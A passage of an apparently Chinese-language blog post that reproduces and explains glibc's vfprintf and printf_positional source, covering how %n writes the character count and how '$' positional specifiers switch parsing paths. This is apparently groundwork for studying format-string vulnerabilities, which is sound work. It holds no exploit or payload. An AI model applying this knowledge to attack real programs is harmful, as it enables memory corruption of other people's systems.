     \\\n      REF (form_unknown),\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (form_unknown),       /* for 't' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    }\n\n```\n\n#### LABEL (form_number)\n\n```c\nLABEL (form_number):\t\t\t\t\t\t      \\\n      if ((mode_flags & PRINTF_FORTIFY) != 0)\t\t\t\t      \\\n\t{\t\t\t\t\t\t\t\t      \\\n\t  if (! readonly_format)\t\t\t\t\t      \\\n\t    {\t\t\t\t\t\t\t\t      \\\n\t      extern int __readonly_area (const void *, size_t)\t\t      \\\n\t\tattribute_hidden;\t\t\t\t\t      \\\n\t      readonly_format\t\t\t\t\t\t      \\\n\t\t= __readonly_area (format, ((STR_LEN (format) + 1)\t      \\\n\t\t\t\t\t    * sizeof (CHAR_T)));\t      \\\n\t    }\t\t\t\t\t\t\t\t      \\\n\t  if (readonly_format < 0)\t\t\t\t\t      \\\n\t    __libc_fatal (\"*** %n in writable segment detected ***\\n\");\t      \\\n\t}\t\t\t\t\t\t\t\t      \\\n      /* Answer the count of characters written.  */\t\t\t      \\\n      void *ptrptr = process_arg_pointer ();\t\t\t\t      \\\n      if (is_longlong)\t\t\t\t\t\t\t      \\\n\t*(long long int *) ptrptr = done;\t\t\t\t      \\\n      else if (is_long_num)\t\t\t\t\t\t      \\\n\t*(long int *) ptrptr = done;\t\t\t\t\t      \\\n      else if (is_char)\t\t\t\t\t\t\t      \\\n\t*(char *) ptrptr = done;\t\t\t\t\t      \\\n      else if (!is_short)\t\t\t\t\t\t      \\\n\t*(int *) ptrptr = done;\t\t\t\t\t\t      \\\n      else\t\t\t\t\t\t\t\t      \\\n\t*(short int *) ptrptr = done;\t\t\t\t\t      \\\n      break;\t\t\n```\n\n#### LABEL(unknow)\n```c \n\tLABEL (form_unknown):\n\t  if (spec == L_('\\0'))\n\t    {\n\t      /* The format string ended before the specifier is complete.  */\n\t      __set_errno (EINVAL);\n\t      done = -1;\n\t      goto all_done;\n\t    }\n\n\t  /* If we are in the fast loop force entering the complicated\n\t     one.  */\n\t  goto do_positional;\n\n```\n所以继续分析vfprintf 函数\n\n```c\nint\nvfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags)\n{\n  /* The character used as thousands separator.  */\n  THOUSANDS_SEP_T thousands_sep = 0;\n\n  /* The string describing the size of groups of digits.  */\n  const char *grouping;\n\n  /* Place to accumulate the result.  */\n  int done;\n\n  /* Current character in format string.  */\n  const UCHAR_T *f;\n\n  /* End of leading constant string.  */\n  const UCHAR_T *lead_str_end;\n\n  /* Points to next format specifier.  */\n  const UCHAR_T *end_of_spec;\n\n  /* Buffer intermediate results.  */\n  CHAR_T work_buffer[WORK_BUFFER_SIZE];\n  CHAR_T *workend;\n\n  /* We have to save the original argument pointer.  */\n  va_list ap_save;\n\n  /* Count number of specifiers we already processed.  */\n  int nspecs_done;\n\n  /* For the %m format we may need the current `errno' value.  */\n  int save_errno = errno;\n\n  /* 1 if format is in read-only memory, -1 if it is in writable memory,\n     0 if unknown.  */\n  int readonly_format = 0;\n\n  /* Orient the stream.  */\n#ifdef ORIENT\n  ORIENT;\n#endif\n\n  /* Sanity check of arguments.  */\n  ARGCHECK (s, format);\n\n#ifdef ORIENT\n  /* Check for correct orientation.  */\n  if (_IO_vtable_offset (s) == 0\n      && _IO_fwide (s, sizeof (CHAR_T) == 1 ? -1 : 1)\n      != (sizeof (CHAR_T) == 1 ? -1 : 1))\n    /* The stream is already oriented otherwise.  */\n    return EOF;\n#endif\n\n  if (UNBUFFERED_P (s))\n    /* Use a helper function which will allocate a local temporary buffer\n       for the stream and then call us again.  */\n    return buffered_vfprintf (s, format, ap, mode_flags);\n\n  /* Initialize local variables.  */\n  done = 0;\n  grouping = (const char *) -1;\n#ifdef __va_copy\n  /* This macro will be available soon in gcc's <stdarg.h>.  We need it\n     since on some systems `va_list' is not an integral type.  */\n  __va_copy (ap_save, ap);\n#else\n  ap_save = ap;\n#endif\n  nspecs_done = 0;\n\n#ifdef COMPILE_WPRINTF\n  /* Find the first format specifier.  */\n  f = lead_str_end = __find_specwc ((const UCHAR_T *) format);\n#else\n  /* Find the first format specifier.  */\n  f = lead_str_end = __find_specmb ((const UCHAR_T *) format);\n#endif\n\n  /* Lock stream.  */\n  _IO_cleanup_region_start ((void (*) (void *)) &_IO_funlockfile, s);\n  _IO_flockfile (s);\n\n  /* Write the literal text before the first format.  */\n  outstring ((const UCHAR_T *) format,\n\t     lead_str_end - (const UCHAR_T *) format);\n\n  /* If we only have to print a simple string, return now.  */\n  if (*f == L_('\\0'))\n    goto all_done;\n\n  /* Use the slow path in case any printf handler is registered.  */\n  if (__glibc_unlikely (__printf_function_table != NULL\n\t\t\t|| __printf_modifier_table != NULL\n\t\t\t|| __printf_va_arg_table != NULL))\n    goto do_positional;\n\n  /* Process whole format string.  */\n  do\n    {\n      STEP0_3_TABLE;\n      STEP4_TABLE;\n\n      int is_negative;\t/* Flag for negative number.  */\n      union\n      {\n\tunsigned long long int longlong;\n\tunsigned long int word;\n      } number;\n      int base;\n      union printf_arg the_arg;\n      CHAR_T *string;\t/* Pointer to argument string.  */\n      int alt = 0;\t/* Alternate format.  */\n      int space = 0;\t/* Use space prefix if no sign is needed.  */\n      int left = 0;\t/* Left-justify output.  */\n      int showsign = 0;\t/* Always begin with plus or minus sign.  */\n      int group = 0;\t/* Print numbers according grouping rules.  */\n      /* Argument is long double/long long int.  Only used if\n\t double/long double or long int/long long int are distinct.  */\n      int is_long_double __attribute__ ((unused)) = 0;\n      int is_short = 0;\t/* Argument is short int.  */\n      int is_long = 0;\t/* Argument is long int.  */\n      int is_char = 0;\t/* Argument is promoted (unsigned) char.  */\n      int width = 0;\t/* Width of output; 0 means none specified.  */\n      int prec = -1;\t/* Precision of output; -1 means none specified.  */\n      /* This flag is set by the 'I' modifier and selects the use of the\n\t `outdigits' as determined by the current locale.  */\n      int use_outdigits = 0;\n      UCHAR_T pad = L_(' ');/* Padding character.  */\n      CHAR_T spec;\n\n      workend = work_buffer + WORK_BUFFER_SIZE;\n\n      /* Get current character in format string.  */\n      JUMP (*++f, step0_jumps);\n\n      /* ' ' flag.  */\n    LABEL (flag_space):\n      space = 1;\n      JUMP (*++f, step0_jumps);\n\n      /* '+' flag.  */\n    LABEL (flag_plus):\n      showsign = 1;\n      JUMP (*++f, step0_jumps);\n\n      /* The '-' flag.  */\n    LABEL (flag_minus):\n      left = 1;\n      pad = L_(' ');\n      JUMP (*++f, step0_jumps);\n\n      /* The '#' flag.  */\n    LABEL (flag_hash):\n      alt = 1;\n      JUMP (*++f, step0_jumps);\n\n      /* The '0' flag.  */\n    LABEL (flag_zero):\n      if (!left)\n\tpad = L_('0');\n      JUMP (*++f, step0_jumps);\n\n      /* The '\\'' flag.  */\n    LABEL (flag_quote):\n      group = 1;\n\n      if (grouping == (const char *) -1)\n\t{\n#ifdef COMPILE_WPRINTF\n\t  thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,\n\t\t\t\t\t    _NL_NUMERIC_THOUSANDS_SEP_WC);\n#else\n\t  thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);\n#endif\n\n\t  grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);\n\t  if (*grouping == '\\0' || *grouping == CHAR_MAX\n#ifdef COMPILE_WPRINTF\n\t      || thousands_sep == L'\\0'\n#else\n\t      || *thousands_sep == '\\0'\n#endif\n\t      )\n\t    grouping = NULL;\n\t}\n      JUMP (*++f, step0_jumps);\n\n    LABEL (flag_i18n):\n      use_outdigits = 1;\n      JUMP (*++f, step0_jumps);\n\n      /* Get width from argument.  */\n    LABEL (width_asterics):\n      {\n\tconst UCHAR_T *tmp;\t/* Temporary value.  */\n\n\ttmp = ++f;\n\tif (ISDIGIT (*tmp))\n\t  {\n\t    int pos = read_int (&tmp);\n\n\t    if (pos == -1)\n\t      {\n\t\t__set_errno (EOVERFLOW);\n\t\tdone = -1;\n\t\tgoto all_done;\n\t      }\n\n\t    if (pos && *tmp == L_('$'))\n\t      /* The width comes from a positional parameter.  */\n\t      goto do_positional;\n\t  }\n\twidth = va_arg (ap, int);\n\n\t/* Negative width means left justified.  */\n\tif (width < 0)\n\t  {\n\t    width = -width;\n\t    pad = L_(' ');\n\t    left = 1;\n\t  }\n      }\n      JUMP (*f, step1_jumps);\n\n      /* Given width in format string.  */\n    LABEL (width):\n      width = read_int (&f);\n\n      if (__glibc_unlikely (width == -1))\n\t{\n\t  __set_errno (EOVERFLOW);\n\t  done = -1;\n\t  goto all_done;\n\t}\n\n      if (*f == L_('$'))\n\t/* Oh, oh.  The argument comes from a positional parameter.  */\n\tgoto do_positional;\n      JUMP (*f, step1_jumps);\n\n    LABEL (precision):\n      ++f;\n      if (*f == L_('*'))\n\t{\n\t  const UCHAR_T *tmp;\t/* Temporary value.  */\n\n\t  tmp = ++f;\n\t  if (ISDIGIT (*tmp))\n\t    {\n\t      int pos = read_int (&tmp);\n\n\t      if (pos == -1)\n\t\t{\n\t\t  __set_errno (EOVERFLOW);\n\t\t  done = -1;\n\t\t  goto all_done;\n\t\t}\n\n\t      if (pos && *tmp == L_('$'))\n\t\t/* The precision comes from a positional parameter.  */\n\t\tgoto do_positional;\n\t    }\n\t  prec = va_arg (ap, int);\n\n\t  /* If the precision is negative the precision is omitted.  */\n\t  if (prec < 0)\n\t    prec = -1;\n\t}\n      else if (ISDIGIT (*f))\n\t{\n\t  prec = read_int (&f);\n\n\t  /* The precision was specified in this case as an extremely\n\t     large positive value.  */\n\t  if (prec == -1)\n\t    {\n\t      __set_errno (EOVERFLOW);\n\t      done = -1;\n\t      goto all_done;\n\t    }\n\t}\n      else\n\tprec = 0;\n      JUMP (*f, step2_jumps);\n\n      /* Process 'h' modifier.  There might another 'h' following.  */\n    LABEL (mod_half):\n      is_short = 1;\n      JUMP (*++f, step3a_jumps);\n\n      /* Process 'hh' modifier.  */\n    LABEL (mod_halfhalf):\n      is_short = 0;\n      is_char = 1;\n      JUMP (*++f, step4_jumps);\n\n      /* Process 'l' modifier.  There might another 'l' following.  */\n    LABEL (mod_long):\n      is_long = 1;\n      JUMP (*++f, step3b_jumps);\n\n      /* Process 'L', 'q', or 'll' modifier.  No other modifier is\n\t allowed to follow.  */\n    LABEL (mod_longlong):\n      is_long_double = 1;\n      is_long = 1;\n      JUMP (*++f, step4_jumps);\n\n    LABEL (mod_size_t):\n      is_long_double = sizeof (size_t) > sizeof (unsigned long int);\n      is_long = sizeof (size_t) > sizeof (unsigned int);\n      JUMP (*++f, step4_jumps);\n\n    LABEL (mod_ptrdiff_t):\n      is_long_double = sizeof (ptrdiff_t) > sizeof (unsigned long int);\n      is_long = sizeof (ptrdiff_t) > sizeof (unsigned int);\n      JUMP (*++f, step4_jumps);\n\n    LABEL (mod_intmax_t):\n      is_long_double = sizeof (intmax_t) > sizeof (unsigned long int);\n      is_long = sizeof (intmax_t) > sizeof (unsigned int);\n      JUMP (*++f, step4_jumps);\n\n      /* Process current format.  */\n      while (1)\n\t{\n#define process_arg_int() va_arg (ap, int)\n#define process_arg_long_int() va_arg (ap, long int)\n#define process_arg_long_long_int() va_arg (ap, long long int)\n#define process_arg_pointer() va_arg (ap, void *)\n#define process_arg_string() va_arg (ap, const char *)\n#define process_arg_unsigned_int() va_arg (ap, unsigned int)\n#define process_arg_unsigned_long_int() va_arg (ap, unsigned long int)\n#define process_arg_unsigned_long_long_int() va_arg (ap, unsigned long long int)\n#define process_arg_wchar_t() va_arg (ap, wchar_t)\n#define process_arg_wstring() va_arg (ap, const wchar_t *)\n\t  process_arg ();\n\t  process_string_arg ();\n#undef process_arg_int\n#undef process_arg_long_int\n#undef process_arg_long_long_int\n#undef process_arg_pointer\n#undef process_arg_string\n#undef process_arg_unsigned_int\n#undef process_arg_unsigned_long_int\n#undef process_arg_unsigned_long_long_int\n#undef process_arg_wchar_t\n#undef process_arg_wstring\n\n\tLABEL (form_float):\n\tLABEL (form_floathex):\n\t  {\n\t    if (__glibc_unlikely ((mode_flags & PRINTF_LDBL_IS_DBL) != 0))\n\t      is_long_double = 0;\n\n\t    struct printf_info info =\n\t      {\n\t\t.prec = prec,\n\t\t.width = width,\n\t\t.spec = spec,\n\t\t.is_long_double = is_long_double,\n\t\t.is_short = is_short,\n\t\t.is_long = is_long,\n\t\t.alt = alt,\n\t\t.space = space,\n\t\t.left = left,\n\t\t.showsign = showsign,\n\t\t.group = group,\n\t\t.pad = pad,\n\t\t.extra = 0,\n\t\t.i18n = use_outdigits,\n\t\t.wide = sizeof (CHAR_T) != 1,\n\t\t.is_binary128 = 0\n\t      };\n\n\t    PARSE_FLOAT_VA_ARG_EXTENDED (info);\n\t    const void *ptr = &the_arg;\n\n\t    int function_done = __printf_fp_spec (s, &info, &ptr);\n\t    if (function_done < 0)\n\t      {\n\t\tdone = -1;\n\t\tgoto all_done;\n\t      }\n\t    done_add (function_done);\n\t  }\n\t  break;\n\n\tLABEL (form_unknown):\n\t  if (spec == L_('\\0'))\n\t    {\n\t      /* The format string ended before the specifier is complete.  */\n\t      __set_errno (EINVAL);\n\t      done = -1;\n\t      goto all_done;\n\t    }\n\n\t  /* If we are in the fast loop force entering the complicated\n\t     one.  */\n\t  goto do_positional;\n\t}\n\n      /* The format is correctly handled.  */\n      ++nspecs_done;\n\n      /* Look for next format specifier.  */\n#ifdef COMPILE_WPRINTF\n      f = __find_specwc ((end_of_spec = ++f));\n#else\n      f = __find_specmb ((end_of_spec = ++f));\n#endif\n\n      /* Write the following constant string.  */\n      outstring (end_of_spec, f - end_of_spec);\n    }\n  while (*f != L_('\\0'));\n\n  /* Unlock stream and return.  */\n  goto all_done;\n\n  /* Hand off processing for positional parameters.  */\ndo_positional:\n  done = printf_positional (s, format, readonly_format, ap, &ap_save,\n\t\t\t    done, nspecs_done, lead_str_end, work_buffer,\n\t\t\t    save_errno, grouping, thousands_sep, mode_flags);\n\n all_done:\n  /* Unlock the stream.  */\n  _IO_funlockfile (s);\n  _IO_cleanup_region_end (0);\n\n  return done;\n}\n```\n### printf_positional\n\n```c\nstatic int\nprintf_positional (FILE *s, const CHAR_T *format, int readonly_format,\n\t\t   va_list ap, va_list *ap_savep, int done, int nspecs_done,\n\t\t   const UCHAR_T *lead_str_end,\n\t\t   CHAR_T *work_buffer, int save_errno,\n\t\t   const char *grouping, THOUSANDS_SEP_T thousands_sep,\n\t\t   unsigned int mode_flags)\n{\n  /* For positional argument handling.  */\n  struct scratch_buffer specsbuf;\n  scratch_buffer_init (&specsbuf);\n  struct printf_spec *specs = specsbuf.data;\n  size_t specs_limit = specsbuf.length / sizeof (specs[0]);\n\n  /* Used as a backing store for args_value, args_size, args_type\n     below.  */\n  struct scratch_buffer argsbuf;\n  scratch_buffer_init (&argsbuf);\n\n  /* Array with information about the needed arguments.  This has to\n     be dynamically extensible.  */\n  size_t nspecs = 0;\n\n  /* The number of arguments the format string requests.  This will\n     determine the size of the array needed to store the argument\n     attributes.  */\n  size_t nargs = 0;\n\n  /* Positional parameters refer to arguments directly.  This could\n     also determine the maximum number of arguments.  Track the\n     maximum number.  */\n  size_t max_ref_arg = 0;\n\n  /* Just a counter.  */\n  size_t cnt;\n\n  if (grouping == (const char *) -1)\n    {\n#ifdef COMPILE_WPRINTF\n      thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,\n\t\t\t\t\t_NL_NUMERIC_THOUSANDS_SEP_WC);\n#else\n      thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);\n#endif\n\n      grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);\n      if (*grouping == '\\0' || *grouping == CHAR_MAX)\n\tgrouping = NULL;\n    }\n\n  for (const UCHAR_T *f = lead_str_end; *f != L_('\\0');\n       f = specs[nspecs++].next_fmt)\n    {\n      if (nspecs == specs_limit)\n\t{\n\t  if (!scratch_buffer_grow_preserve (&specsbuf))\n\t    {\n\t      done = -1;\n\t      goto all_done;\n\t    }\n\t  specs = specsbuf.data;\n\t  specs_limit = specsbuf.length / sizeof (specs[0]);\n\t}\n\n      /* Parse the format specifier.  */\n#ifdef COMPILE_WPRINTF\n      nargs += __parse_one_specwc (f, nargs, &specs[nspecs], &max_ref_arg);\n#else\n      nargs += __parse_one_specmb (f, nargs, &specs[nspecs], &max_ref_arg);\n#endif\n    }\n\n  /* Determine the number of arguments the format string consumes.  */\n  nargs = MAX (nargs, max_ref_arg);\n\n  union printf_arg *args_value;\n  int *args_size;\n  int *args_type;\n  {\n    /* Calculate total size needed to represent a single argument\n       across all three argument-related arrays.  */\n    size_t bytes_per_arg\n      = sizeof (*args_value) + sizeof (*args_size) + sizeof (*args_type);\n    if (!scratch_buffer_set_array_size (&argsbuf, nargs, bytes_per_arg))\n      {\n\tdone = -1;\n\tgoto all_done;\n      }\n    args_value = argsbuf.data;\n    /* Set up the remaining two arrays to each point past the end of\n       the prior array, since space for all three has been allocated\n       now.  */\n    args_size = &args_value[nargs].pa_int;\n    args_type = &args_size[nargs];\n    memset (args_type, (mode_flags & PRINTF_FORTIFY) != 0 ? '\\xff' : '\\0',\n\t    nargs * sizeof (*args_type));\n  }\n\n  /* XXX Could do sanity check here: If any element in ARGS_TYPE is\n     still zero after this loop, format is invalid.  For now we\n     simply use 0 as the value.  */\n\n  /* Fill in the types of all the arguments.  */\n  for (cnt = 0; cnt < nspecs; ++cnt)\n    {\n      /* If the width is determined by an argument this is an int.  */\n      if (specs[cnt].width_arg != -1)\n\targs_type[specs[cnt].width_arg] = PA_INT;\n\n      /* If the precision is determined by an argument this is an int.  */\n      if (specs[cnt].prec_arg != -1)\n\targs_type[specs[cnt].prec_arg] = PA_INT;\n\n      switch (specs[cnt].ndata_args)\n\t{\n\tcase 0:\t\t/* No arguments.  */\n\t  break;\n\tcase 1:\t\t/* One argument; we already have the\n\t\t\t   type and size.  */\n\t  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;\n\t  args_size[specs[cnt].data_arg] = specs[cnt].size;\n\t  break;\n\tdefault:\n\t  /* We have more than one argument for this format spec.\n\t     We must call the arginfo function again to determine\n\t     all the types.  */\n\t  (void) (*__printf_arginfo_table[specs[cnt].info.spec])\n\t    (&specs[cnt].info,\n\t     specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],\n\t     &args_size[specs[cnt].data_arg]);\n\t  break;\n\t}\n    }\n\n  /* Now we know all the types and the order.  Fill in the argument\n     values.  */\n  for (cnt = 0; cnt < nargs; ++cnt)\n    switch (args_type[cnt])\n      {\n#define T(tag, mem, type)\t\t\t\t\\\n\tcase tag:\t\t\t\t\t\\\n\t  args_value[cnt].mem = va_arg (*ap_savep, type); \\\n\t  break\n\n\tT (PA_WCHAR, pa_wchar, wint_t);\n      case PA_CHAR:\t\t\t\t/* Promoted.  */\n      case PA_INT|PA_FLAG_SHORT:\t\t/* Promoted.  */\n#if LONG_MAX == INT_MAX\n      case PA_INT|PA_FLAG_LONG:\n#endif\n\tT (PA_INT, pa_int, int);\n#if LONG_MAX == LONG_LONG_MAX\n      case PA_INT|PA_FLAG_LONG:\n#endif\n\tT (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, long long int);\n#if LONG_MAX != INT_MAX && LONG_MAX != LONG_LONG_MAX\n# error \"he?\"\n#endif\n      case PA_FLOAT:\t\t\t\t/* Promoted.  */\n\tT (PA_DOUBLE, pa_double, double);\n      case PA_DOUBLE|PA_FLAG_LONG_DOUBLE:\n\tif (__glibc_unlikely ((mode_flags & PRINTF_LDBL_IS_DBL) != 0))\n\t  {\n\t    args_value[cnt].pa_double = va_arg (*ap_savep, double);\n\t    args_type[cnt] &= ~PA_FLAG_LONG_DOUBLE;\n\t  }\n#if __HAVE_FLOAT128_UNLIKE_LDBL\n\telse if ((mode_flags & PRINTF_LDBL_USES_FLOAT128) != 0)\n\t  args_value[cnt].pa_float128 = va_arg (*ap_savep, _Float128);\n#endif\n\telse\n\t  args_value[cnt].pa_long_double = va_arg (*ap_savep, long double);\n\tbreak;\n      case PA_STRING:\t\t\t\t/* All pointers are the same */\n      case PA_WSTRING:\t\t\t/* All pointers are the same */\n\tT (PA_POINTER, pa_pointer, void *);\n#undef T\n      default:\n\tif ((args_type[cnt] & PA_FLAG_PTR) != 0)\n\t  args_value[cnt].pa_pointer = va_arg (*ap_savep, void *);\n\telse if (__glibc_unlikely (__printf_va_arg_table != NULL)\n\t\t && __printf_va_arg_table[args_type[cnt] - PA_LAST] != NULL)\n\t  {\n\t    args_value[cnt].pa_user = alloca (args_size[cnt]);\n\t    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])\n\t      (args_value[cnt].pa_user, ap_savep);\n\t  }\n\telse\n\t  memset (&args_value[cnt], 0, sizeof (args_value[cnt]));\n\tbreak;\n      case -1:\n\t/* Error case.  Not all parameters appear in N$ format\n\t   strings.  We have no way to determine their type.  */\n\tassert ((mode_flags & PRINTF_FORTIFY) != 0);\n\t__libc_fatal (\"*** invalid %N$ use detected ***\\n\");\n      }\n\n  /* Now walk through all format specifiers and process them.  */\n  for (; (size_t) nspecs_done < nspecs; ++nspecs_done)\n    {\n      STEP4_TABLE;\n\n      int is_negative;\n      union\n      {\n\tunsigned long long int longlong;\n\tunsigned long int word;\n      } number;\n      int base;\n      CHAR_T *string;\t\t/* Pointer to argument string.  */\n\n      /* Fill variables from values in struct.  */\n      int alt = specs[nspecs_done].info.alt;\n      int space = specs[nspecs_done].info.space;\n      int left = specs[nspecs_done].info.left;\n      int showsign = specs[nspecs_done].info.showsign;\n      int group = specs[nspecs_done].info.group;\n      int is_long_double __attribute__ ((unused))\n\t= specs[nspecs_done].info.is_long_double;\n      int is_short = specs[nspecs_done].info.is_short;\n      int is_char = specs[nspecs_done].info.is_char;\n      int is_long = specs[nspecs_done].info.is_long;\n      int width = specs[nspecs_done].info.width;\n      int prec = specs[nspecs_done].info.prec;\n      int use_outdigits = specs[nspecs_done].info.i18n;\n      char pad = specs[nspecs_done].info.pad;\n      CHAR_T spec = specs[nspecs_done].info.spec;\n\n      CHAR_T *workend = work_buffer + WORK_BUFFER_SIZE;\n\n      /* Fill in last information.  */\n      if (specs[nspecs_done].width_arg != -1)\n\t{\n\t  /* Extract the field width from an argument.  */\n\t  specs[nspecs_done].info.width =\n\t    args_value[specs[nspecs_done].width_arg].pa_int;\n\n\t  if (specs[nspecs_done].info.width < 0)\n\t    /* If the width value is negative left justification is\n\t       selected and the value is taken as being positive.  */\n\t    {\n\t      specs[nspecs_done].info.width *= -1;\n\t      left = specs[nspecs_done].info.left = 1;\n\t    }\n\t  width = specs[nspecs_done].info.width;\n\t}\n\n      if (specs[nspecs_done].prec_arg != -1)\n\t{\n\t  /* Extract the precision from an argument.  */\n\t  specs[nspecs_done].info.prec =\n\t    args_value[specs[nspecs_done].prec_arg].pa_int;\n\n\t  if (specs[nspecs_done].info.prec < 0)\n\t    /* If the precision is negative the precision is\n\t       omitted.  */\n\t    specs[nspecs_done].info.prec = -1;\n\n\t  prec = specs[nspecs_done].info.prec;\n\t}\n\n      /* Process format specifiers.  */\n      while (1)\n\t{\n\t  extern printf_function **__printf_function_table;\n\t  int function_done;\n\n\t  if (spec <= UCHAR_MAX\n\t      && __printf_function_table != NULL\n\t      && __printf_function_table[(size_t) spec] != NULL)\n\t    {\n\t      const void **ptr = alloca (specs[nspecs_done].ndata_args\n\t\t\t\t\t * sizeof (const void *));\n\n\t      /* Fill in an array of pointers to the argument values.  */\n\t      for (unsigned int i = 0; i < specs[nspecs_done].ndata_args;\n\t\t   ++i)\n\t\tptr[i] = &args_value[specs[nspecs_done].data_arg + i];\n\n\t      /* Call the function.  */\n\t      function_done = __printf_function_table[(size_t) spec]\n\t\t(s, &specs[nspecs_done].info, ptr);\n\n\t      if (function_done != -2)\n\t\t{\n\t\t  /* If an error occurred we don't have information\n\t\t     about # of chars.  */\n\t\t  if (function_done < 0)\n\t\t    {\n\t\t      /* Function has set errno.  */\n\t\t      done = -1;\n\t\t      goto all_done;\n\t\t    }\n\n\t\t  done_add (function_done);\n\t\t  break;\n\t\t}\n\t    }\n\n\t  JUMP (spec, step4_jumps);\n\n#define process_arg_data args_value[specs[nspecs_done].data_arg]\n#define process_arg_int() process_arg_data.pa_int\n#define process_arg_long_int() process_arg_data.pa_long_int\n#define process_arg_long_long_int() process_arg_data.pa_long_long_int\n#define process_arg_pointer() process_arg_data.pa_pointer\n#define process_arg_string() process_arg_data.pa_string\n#define process_arg_unsigned_int() process_arg_data.pa_u_int\n#define process_arg_unsigned_long_int() process_arg_data.pa_u_long_int\n#define process_arg_unsigned_long_long_int() process_arg_data.pa_u_long_long_int\n#define process_arg_wchar_t() process_arg_data.pa_wchar\n#define process_arg_wstring() process_arg_data.pa_wstring\n\t  process_arg ();\n\t  process_string_arg ();\n#undef process_arg_data\n#undef process_arg_int\n#undef process_arg_long_int\n#undef process_arg_long_long_int\n#undef process_arg_pointer\n#undef process_arg_string\n#undef process_arg_unsigned_int\n#undef process_arg_unsigned_long_int\n#undef process_arg_unsigned_long_long_int\n#undef process_arg_wchar_t\n#undef process_arg_wstring\n\n\t  LABEL (form_float):\n\t  LABEL (form_floathex):\n\t  {\n\t    const void *ptr\n\t      = (const void *) &args_value[specs[nspecs_done].data_arg];\n\t    if (__glibc_unlikely ((mode_flags & PRINTF_LDBL_IS_DBL) != 0))\n\t      {\n\t\tspecs[nspecs_done].data_arg_type = PA_DOUBLE;\n\t\tspecs[nspecs_done].info.is_long_double = 0;\n\t      }\n\t    SETUP_FLOAT128_INFO (specs[nspecs_done].info);\n\n\t    int function_done\n\t      = __printf_fp_spec (s, &specs[nspecs_done].info, &ptr);\n\t    if (function_done < 0)\n\t      {\n\t\t/* Error in print handler; up to handler to set errno.  */\n\t\tdone = -1;\n\t\tgoto all_done;\n\t      }\n\t    done_add (function_done);\n\t  }\n\t  break;\n\n\t  LABEL (form_unknown):\n\t  {\n\t    unsigned int i;\n\t    const void **ptr;\n\n\t    ptr = alloca (specs[nspecs_done].ndata_args\n\t\t\t  * sizeof (const void *));\n\n\t    /* Fill in an array of pointers to the argument values.  */\n\t    for (i = 0; i < specs[nspecs_done].ndata_args; ++i)\n\t      ptr[i] = &args_value[specs[nspecs_done].data_arg + i];\n\n\t    /* Call the function.  */\n\t    function_done = printf_unknown (s, &specs[nspecs_done].info,\n\t\t\t\t\t    ptr);\n\n\t    /* If an error occurred we don't have information about #\n\t       of chars.  */\n\t    if (function_done < 0)\n\t      {\n\t\t/* Function has set errno.  */\n\t\tdone = -1;\n\t\tgoto all_done;\n\t      }\n\n\t    done_add (function_done);\n\t  }\n\t  break;\n\t}\n\n      /* Write the following constant string.  */\n      outstring (specs[nspecs_done].end_of_fmt,\n\t\t specs[nspecs_done].next_fmt\n\t\t - specs[nspecs_done].end_of_fmt);\n    }\n all_done:\n  scratch_buffer_free (&argsbuf);\n  scratch_buffer_free (&specsbuf);\n  return done;\n}\n```\n\n## 解析流程\n\n### 无 \"$\"符\n\n没有\"$\"符，程序就会在这里跳来跳起，完成全部解析\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811180756048.png)\n\n我们来表中是什么\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811181243402.png)\n\n\n关于LABEL (form_number)的源码在上文中有，这里不再赘述。它的功能就顺序往参数里写数据，并且是实时的。\n\n关于LABEL(unknown)的源码上文也有，功能也就是检测当前字符是否为终止符，是则结束，不是则继续。\n\n### 有\"$\" 符\n\n在vfprintf的do循环中会获取当前字符，并进行一次跳表的寻找找到对应字符的操作函数，跳转执行。\n如果遇到`$`符，或者遇到`unknown`的字符，就会调用`printf_positional`,去做复杂的字符串的解析\n```c\n  union printf_arg *args_value;\n  int *args_size;\n  int *args_type;\n  {\n    /* Calculate total size needed to represent a single argument\n       across all three argument-related arrays.  */\n    size_t bytes_per_arg\n      = sizeof (*args_value) + sizeof (*args_size) + sizeof (*args_type);\n    if (!scratch_buffer_set_array_size (&argsbuf, nargs, bytes_per_arg))\n      {\n\tdone = -1;\n\tgoto all_done;\n      }\n    args_value = argsbuf.data;\n    /* Set up the remaining two arrays to each point past the end of\n       the prior array, since space for all three has been allocated\n       now.  */\n    args_size = &args_value[nargs].pa_int;\n    args_type = &args_size[nargs];\n    memset (args_type, (mode_flags & PRINTF_FORTIFY) != 0 ? '\\xff' : '\\0',\n\t    nargs * sizeof (*args_type));\n  }\n\n  /* XXX Could do sanity check here: If any element in ARGS_TYPE is\n     still zero after this loop, format is invalid.  For now we\n     simply use 0 as the value.  */\n\n  /* Fill in the types of all the arguments.  */\n  for (cnt = 0; cnt < nspecs; ++cnt)\n    {\n   